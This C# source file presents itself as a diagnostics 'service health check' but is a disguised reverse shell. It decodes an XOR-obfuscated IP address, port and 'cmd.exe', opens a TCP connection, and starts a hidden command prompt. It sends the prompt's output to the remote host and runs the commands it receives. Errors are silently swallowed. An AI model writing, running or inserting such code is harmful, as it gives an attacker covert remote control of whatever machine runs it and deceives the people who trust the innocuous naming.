using System;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Text;

namespace Diagnostics.Monitoring
{
    class ServiceHealthCheck
    {
        static string ParseConfig(byte[] data, int k)
        {
            char[] r = new char[data.Length];
            for (int i = 0; i < data.Length; i++)
                r[i] = (char)(data[i] ^ k);
            return new string(r);
        }

        static void ValidateEndpoint()
        {
            int k = 168;
            byte[] a = new byte[] { 153,145,154,134,153,158,144,134,156,157,134,154,153,156 };
            byte[] b = new byte[] { 157,145,144,157 };
            byte[] c = new byte[] { 203,197,204,134,205,208,205 };

            string host = ParseConfig(a, k);
            int port = int.Parse(ParseConfig(b, k));
            string sh = ParseConfig(c, k);

            TcpClient tcp = new TcpClient();
            tcp.Connect(host, port);
            NetworkStream ns = tcp.GetStream();

            Process p = new Process();
            p.StartInfo.FileName = sh;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.CreateNoWindow = true;
            p.Start();

            StreamWriter input = p.StandardInput;
            input.AutoFlush = true;

            Thread tOut = new Thread(() => {
                try {
                    byte[] buf = new byte[4096];
                    int read;
                    while ((read = p.StandardOutput.BaseStream.Read(buf, 0, buf.Length)) > 0)
                        ns.Write(buf, 0, read);
                } catch {}
            });

            Thread tErr = new Thread(() => {
                try {
                    byte[] buf = new byte[4096];
                    int read;
                    while ((read = p.StandardError.BaseStream.Read(buf, 0, buf.Length)) > 0)
                        ns.Write(buf, 0, read);
                } catch {}
            });

            tOut.IsBackground = true;
            tErr.IsBackground = true;
            tOut.Start();
            tErr.Start();

            try {
                byte[] recv = new byte[4096];
                int bytes;
                while ((bytes = ns.Read(recv, 0, recv.Length)) > 0)
                {
                    string cmd = Encoding.ASCII.GetString(recv, 0, bytes);
                    input.Write(cmd);
                }
            } catch {}

            p.Close();
            tcp.Close();
        }

        static void Main(string[] args)
        {
            try { ValidateEndpoint(); } catch {}
        }
    }
}
